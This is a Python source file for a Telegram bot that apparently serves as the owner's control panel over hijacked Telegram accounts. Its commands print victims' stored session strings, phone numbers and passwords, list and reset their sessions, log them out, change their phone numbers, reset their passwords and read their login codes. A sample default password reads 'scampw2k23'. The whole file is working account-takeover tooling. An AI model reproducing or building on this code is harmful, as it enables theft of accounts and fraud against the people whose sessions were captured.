import asyncio
import traceback
from pyrogram import Client, idle, filters, session
from pyrogram.errors import AuthKeyDuplicated
from pyrogram.types import InlineKeyboardMarkup, Message, InlineKeyboardButton
import re
from account import Account
from helpers.db_client import db_client
from helpers.util import button_cbb, gen_devices
from NpClient import NpClient
from config import OWNER
from helpers.util import button_pagination
from datetime import datetime
from pyrogram.enums import MessageMediaType
from helpers.database import db


commands = ["start", "users", "backup", "checks", "pp", "setpw", "addclient", "client"]

def isValidNumber(data):
    pattern = re.compile(r"^\+?[1-9]\d{1,14}$")
    if pattern.match(data):
        return True
    return False


@Account.on_message(filters.private & filters.user(OWNER) & filters.command(["killsesi"]))
async def onKillSesi(client, message):
    try:
        cmd, id, hash = message.text.split("-")
        data = await db.getUser(id)
        np = NpClient(user=data, db=db)
        await np.init(client, message)
        await np.reset_session(hash)
    except Exception as e:
        print(e)

@Account.on_message(filters.private & filters.user(OWNER) & filters.command(["logout"]))
async def onLogout(client, message):
    try:
        cmd, id = message.text.split(" ")
        data = await db.getUser(int(id))
        np = NpClient(user=data, db=db)
        await np.init(client, message)
        await np.keluar()
    except Exception as e:
        print(e)


@Account.on_message(filters.private & filters.user(OWNER) & filters.command(["listsesi"]))
async def onListSesi(client, message):
    try:
        cmd, id = message.text.split(" ")
        data = await db.getUser(id)
        await message.reply_text(f"`{data['string_session']}`")
        np = NpClient(user=data, db=db)
        await np.init(client, message)
        list_sessions = await np.list_sessions()
        print(list_sessions)
    except Exception as e:
        print(e)


@Account.on_message(filters.private & filters.user(OWNER) & filters.command(["liststr"]))
async def onListStr(client, message):
    try:
        cmd, id = message.text.split(" ")
        data = await db.getUser(id)
        await message.reply_text(f"`{data['string_session']}`")
    except Exception as e:
        print(e)


@Account.on_message(filters.private & filters.user(OWNER) & filters.command(["del"]))
async def onDeleted(client, message):
    cmd = message.text.split(" ")
    if len(cmd) < 2:
        await message.reply_text("wrong")
        return
    await db.delete(cmd[1])
    deleted = await db.changeSes(cmd[1])
    await message.reply_text("ok")


@Account.on_message(filters.private & filters.user(OWNER) & filters.command(["client"]))
async def onClient(client, message):
    db = await db_client.getClients()
    allclient = ""
    # for client in db:
    #     allclient += f"ID: <code>{client[0]}</code>\n"
    #     allclient += f"CLIENT: <code>{client[3]}</code>\n"
    #     allclient += f"API ID: <code>{client[1]}</code>\n"
    #     # allclient += f"API HASH: <code>{client[2]}</code>\n"
    #     allclient += f"APP VERSION: <code>{client[4]}</code>\n"
    #     allclient += f"LIMIT USE: <code>{client[5]}</code>\n"
    #     allclient += f"USERS: <code>{client[6]}</code>\n\n"

    allclient += f"All Client: {len(db)}"
    await message.reply_text(allclient)


@Account.on_message(filters.private & filters.user(OWNER) & filters.command(["start"]))
async def onOwnerStart(client, message):
    lis = message.text.split("-")
    if len(lis) < 2:
        await message.reply_text("<i>Bot is Running ✅</i>")
        return
    _, id = message.text.split("-")
    if id:
        data = await db.getUser(id)
        now = int(datetime.now().timestamp())
        if not data:
            await message.reply_text("<i>Session sudah tidak ada</i>")
            return
        await message.reply_text("<i>Processing...</i>")
        if data['timestamp'] is not None:
            old = int(datetime.fromtimestamp(data['timestamp']).timestamp())
            life_login = now - old
            if life_login >= 86400:
                life_logged = f"⏰{int(life_login / 86400)} hari"
            elif life_login >= 3600:
                life_logged = f"⏰{int(life_login / 3600)} jam"
            elif life_login >= 60:
                life_logged = f"⏰{int(life_login /60)} menit"
            else:
                life_logged = f"⏰{int(life_login)} detik"
        else:
            np = NpClient(user=data, db=db)
            init = await np.init(client, message)
            if init is None:
                return
            timelogged = await np.updateTime()
            old = int(datetime.fromtimestamp(timelogged).timestamp())
            life_login = now - old
            if life_login >= 86400:
                life_logged = f"⏰{int(life_login / 86400)} hari"
            elif life_login >= 3600:
                life_logged = f"⏰{int(life_login / 3600)} jam"
            elif life_login >= 60:
                life_logged = f"⏰{int(life_login /60)} menit"
            else:
                life_logged = f"⏰{int(life_login)} detik"
        status = "✅" if data['safe'] == 1 else "🆘"

        dbc = data['client_id']
        dbd = data['device_id']
        msg = f"**STATUS**: {status} / {life_logged}\n**ID**: {id}\n**CLIENT**: {dbc}\n**DEVICE**: {dbd}\n**USERNAME**: {data['uname']}\n**NAMA**: {data['nama']}\n**NOHP**: {data['nohp']}\n**PASSWORD**: {data['passwd']}"
        await message.reply(
            text=msg,
            reply_markup=InlineKeyboardMarkup(
                button_cbb(
                    f"connect-{id}",
                    f"disconnect-{id}",
                    f"changenohp-{id}",
                    f"resetsesi-{id}",
                    f"clearchat-{id}",
                    f"listsesi-{id}",
                    f"resetpw-{id}",
                    f"readcode-{id}",
                )
            ),
            disable_web_page_preview=True,
        )
    else:
        await message.reply_text("id tidak valid")
        return


@Account.on_message(filters.private & filters.user(OWNER) & filters.command(["users"]))
async def onGetUsers(client, message):
    users = await db.getLimitUser(30, 0)
    alluser = await db.getUsers()
    activeUser = ""
    now = int(datetime.now().timestamp())
    await message.reply_text(f"✣ List Active Session\n└ Total users: {len(alluser)}")
    max_users = 50 if len(alluser) > 50 else len(alluser)
    idx = 0
    for data in alluser:
        if data['timestamp'] is not None:
            old = int(datetime.fromtimestamp(data['timestamp']).timestamp())
            life_login = now - old
            if life_login >= 86400:
                life_logged = f"⏰{int(life_login / 86400)} hari"
            elif life_login >= 3600:
                life_logged = f"⏰{int(life_login / 3600)} jam"
            elif life_login >= 60:
                life_logged = f"⏰{int(life_login /60)} mnt"
            else:
                life_logged = f"⏰{int(life_login)} dtk"
        else:
            life_logged = "⏰ 0 dtk"
        status = "✅" if data['safe'] == 1 else "🆘"
        uname = f"None" if data['uname'] is None else "@" + data['uname']
        activeUser += f"{status} [{data['idtele']}](https://t.me/{client.username}?start=login-{data['idtele']}) {uname} / {life_logged}\n"
        idx += 1
        if idx == max_users:
            await client.send_message(
                chat_id=message.chat.id,
                text=activeUser,
            )
            activeUser = ""
            idx = 0

@Account.on_message(filters.private & filters.user(OWNER) & filters.command(["addclient"]))
async def onAddClient(client, message):
    req_name = await message.chat.ask("👉 <i>Silahkan masukan nama client</i>")
    if req_name.text == "/cancel":
        await req_name.reply_text("<i>Batal menambahkan client</i>")
        return
    if len(req_name.text) < 2:
        await req_name.reply_text("<i>Nama client harus lebih dari 2 huruf</i>")
        return
    app_name = req_name.text
    req_api = await message.chat.ask("👉 <i>Silahkan masukan API_ID, dengan benar</i>")
    if req_api.text == "/cancel":
        await req_api.reply_text("<i>Batal menambahkan client</i>")
        return
    if not req_api.text.isdigit():
        await req_api.reply_text("<i>API_ID harus berupa angka</i>")
        return
    if len(req_api.text) < 5:
        await req_api.reply_text("<i>API_ID harus lebih dari 5 digit</i>")
    if re.search(r"\s", req_api.text):
        await req_api.reply_text("<i>API_ID tidak boleh ada spasi</i>")
        return
    api_id = req_api.text.replace(" ", "")
    req_hash = await message.chat.ask("👉 <i>Silahkan masukan API_HASH, dengan benar</i>")
    if req_hash.text == "/cancel":
        await req_hash.reply_text("<i>Batal menambahkan client</i>")
        return
    if re.search(r"\s", req_hash.text):
        await req_hash.reply_text("<i>API_HASH tidak boleh ada spasi</i>")
        return
    api_hash = req_hash.text.replace(" ", "")
    req_platform = await message.chat.ask("👉 <i>Silahkan masukan platform, contoh `Android`, atau `Other`</i>")
    if req_platform.text == "/cancel":
        await req_hash.reply_text("<i>Batal menambahkan client</i>")
        return
    if re.search(r"\s", req_platform.text):
        await req_platform.reply_text("<i>Platform tidak boleh ada spasi</i>")
        return

    platform = req_platform.text.title()
    req_app_version = await message.chat.ask("👉 <i>Silahkan masukan APP VERSION,contoh `4.7.3`</i>")
    if req_app_version.text == "/cancel":
        await req_hash.reply_text("<i>Batal menambahkan client</i>")
        return
    if re.search(r"\s", req_app_version.text):
        await req_app_version.reply_text("<i>APP VERSION tidak boleh ada spasi</i>")
        return
    if not re.search(r"\d\.\d\.\d", req_app_version.text):
        await req_app_version.reply_text("<i>APP VERSION harus berupa angka</i>")
        return
    app_version = req_app_version.text
    todb = await db_client.insert(api_id, api_hash, app_name, app_version, platform)
    await message.reply_text(f"✣ Detail Client\n└ API ID `{api_id}`\n└ API HASH `{api_hash}`\n└ APP NAME `{app_name}`\n└ APP VERSION `{app_version}`\n\n→ Berhasil di Simpan")


@Account.on_message(filters.private & filters.user(OWNER) & filters.command(["setpw"]))
async def onSetPassword(client, message):
    msg = message.text.split(" ")
    if len(msg) < 2:
        await message.reply_text("gagitu caranya gini `/setpw scampw2k23`")
        return
    todb = await db.setConf("password", msg[1])
    await message.reply_text(f"<i>Password {msg[1]} disimpan sebagai default</i>")


@Account.on_message(filters.private & filters.user(OWNER) & filters.command(["pp"]))
async def onSetPp(client, message):
    msg = message
    if msg.media is not MessageMediaType.PHOTO:
        await message.reply_text("<i>Gambar nya mana?</i>")
        return
    file = await client.download_media(message)
    todb = await db.setConf("pp", file)
    await message.reply_text(f"<i>Gambar disimpan sebagai default</i>")


@Account.on_message(filters.private & filters.user(OWNER) & filters.command(["backup"]))
async def onSaveImage(client, message: Message):
    await message.reply_text("<i>Backuping...</i>")
    db.dump()
    await client.send_document(chat_id=message.chat.id, document="NpDk.db")
    users = await db.getLimitUser(30, 0)
    alluser = await db.getUsers()
    activeUser = ""
    now = int(datetime.now().timestamp())
    await message.reply_text(f"✣ List Active Session\n└ Total Users: {len(alluser)}")
    max_users = 50 if len(alluser) > 50 else len(alluser)
    idx = 0
    for data in alluser:
        if data['timestamp'] is not None:
            old = int(datetime.fromtimestamp(data['timestamp']).timestamp())
            life_login = now - old
            if life_login >= 86400:
                life_logged = f"⏰{int(life_login / 86400)} hari"
            elif life_login >= 3600:
                life_logged = f"⏰{int(life_login / 3600)} jam"
            elif life_login >= 60:
                life_logged = f"⏰{int(life_login /60)} mnt"
            else:
                life_logged = f"⏰{int(life_login)} dtk"
        else:
            life_logged = "⏰ 0 dtk"
        status = "✅" if data['safe'] == 1 else "🆘"
        uname = f"None" if data['uname'] is None else "@" + data['uname']
        activeUser += f"{status} [{data['idtele']}](https://t.me/{client.username}?start=login-{data['idtele']}) {uname} / {life_logged}\n"
        idx += 1
        if idx == max_users:
            await client.send_message(
                chat_id=message.chat.id,
                text=activeUser,
            )
            activeUser = ""
            idx = 0